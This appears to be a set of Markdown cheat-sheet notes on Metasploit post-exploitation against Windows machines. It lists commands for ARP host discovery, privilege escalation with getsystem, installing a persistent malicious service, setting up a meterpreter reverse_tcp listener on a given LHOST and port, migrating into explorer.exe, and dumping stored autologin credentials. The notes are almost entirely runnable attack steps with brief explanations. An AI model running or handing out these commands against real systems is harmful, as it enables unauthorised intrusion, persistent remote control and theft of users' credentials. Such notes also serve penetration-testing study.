#### Arp Sweep Scan

```
ARP Sweep allows us to enumerate live hosts in the local network using ARP requests, providing us with a simple and fast way to identify possible targets.

```

#### Useful Commands
```
getsystem > Tries to obtain highest privilege on the remote system
getuid > Server Username
```

#### Maintaining Persistent Access on Windows Machine

```

background
use exploit/windows/local/persistence_service
show options
SESSION

set SESSION 1
exploit

```
> The module will generate a malicious file and upload it to the target machine. Then, it uses the same file to create a persistent service. When the service starts, it will run the uploaded file. As a result, we will receive a meterpreter session.



#### Killing Active Sessions
```
sessions -K
```
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.15.2
set LPORT 4444
exploit
```
>Note : Use same LHOST and LPORT as used previously.

#### Dumping Autologin information
> To extract AutoLogin stored credentials from the target machine we need to migrate current process to explorer.exe sothat we have full control to users environment.
```
migrate -N explorer.exe

background
use post/windows/gather/credentials/windows_autologin
set SESSION 3
exploit
```
![Screenshot at 2022-12-26 12-57-43](https://user-images.githubusercontent.com/85208639/209517391-160c55de-c5c9-44d8-a0d4-adc2a5fd7f17.png)


